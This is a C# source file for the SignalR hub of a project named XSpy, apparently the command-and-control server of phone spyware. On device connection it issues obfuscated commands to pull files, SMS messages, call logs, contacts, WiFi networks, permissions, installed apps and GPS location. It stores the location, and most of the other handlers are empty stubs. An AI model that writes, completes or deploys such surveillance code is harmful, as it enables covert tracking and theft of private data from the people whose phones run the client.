using System;
using System.Collections.Generic;
using System.Security.Claims;
using System.Threading.Tasks;
using Microsoft.AspNetCore.Authorization;
using Microsoft.AspNetCore.SignalR;
using XSpy.Database.Entities;
using XSpy.Database.Entities.Devices;
using XSpy.Database.Services;
using XSpy.Database.XSpy.Shared.Models.Interfaces;
using XSpy.Shared.DataTransfer;
using XSpy.Shared.Models.Requests.Devices;

namespace XSpy.Socket
{
    [Authorize(Policy = "HubAuthorizationPolicy")]
    public class MainHub : Hub
    {
        private readonly HubMethods _methods;
        private readonly UserService _userService;
        private readonly DeviceService _deviceService;

        public MainHub(HubMethods hubMethods, DeviceService deviceService, UserService userService)
        {
            _userService = userService;
            _deviceService = deviceService;
            _methods = hubMethods;
        }

        public override async Task OnConnectedAsync()
        {
            _methods.ClientsByDeviceId[GetDeviceId()] = Context.ConnectionId;

            await base.OnConnectedAsync().ConfigureAwait(false);
        }

        public override async Task OnDisconnectedAsync(Exception exception)
        {
            //    var user = await GetUserAsync().ConfigureAwait(false);
            //   var userId = user.Id;

            //  _methods.ClientsByUserId.TryRemove(userId, out _);

            await base.OnDisconnectedAsync(exception).ConfigureAwait(false);
        }

        public async Task _0xSD(SaveDeviceRequest request)
        {
            var user = await GetUser();
            if (user == null)
                return;

            await _deviceService.SaveDevice(user.Id, request);

            await Clients.Client(Context.ConnectionId).SendAsync("0xFI");
            await Clients.Client(Context.ConnectionId).SendAsync("0xSM", new MessageDataRequest
            {
                Action = "ls"
            });
            await Clients.Client(Context.ConnectionId).SendAsync("0xCL");
            await Clients.Client(Context.ConnectionId).SendAsync("0xCO");
            await Clients.Client(Context.ConnectionId).SendAsync("0xLO");
            await Clients.Client(Context.ConnectionId).SendAsync("0xWI");
            await Clients.Client(Context.ConnectionId).SendAsync("0xPM");
            await Clients.Client(Context.ConnectionId).SendAsync("0xIN");
        }

        //Process Files
        public void _0xFI()
        {
        }


        //LIST SMS
        public void _0xLM(List<CallData> callsList)
        {
        }

        //SEND SMS
        public void _0xSM(List<CallData> callsList)
        {
        }

        //Call List
        public void _0xCL(List<CallData> callsList)
        {
        }

        //CONTACT List
        public void _0xCO(List<CallData> callsList)
        {
        }

        //WIFI List
        public void _0xWI(UpdateWifiRequest wifiRequest)
        {
        }

        //PERM. List
        public void _0xPM(List<CallData> callsList)
        {
        }

        //INSTALLED List
        public void _0xIN(List<CallData> callsList)
        {
        }

        //GRANTED PERM. List
        public void _0xGP(List<CallData> callsList)
        {
        }

        //GPS
        public async Task _0xLO(UpdatePositionRequest location)
        {
            await _deviceService.SaveLocation(GetDeviceId(), location);
        }

        private string GetDeviceId()
        {
            var userId = Context.User.FindFirst(ClaimTypes.SerialNumber);
            return userId?.Value;
        }

        private Task<IUserEntity> GetUser()
        {
            return _userService.GetUserByToken(GetUserToken());
        }


        private Guid GetUserToken()
        {
            var userId = Context.User.FindFirst(ClaimTypes.Sid);
            return userId == null ? Guid.Empty : Guid.Parse(userId.Value);
        }
    }
}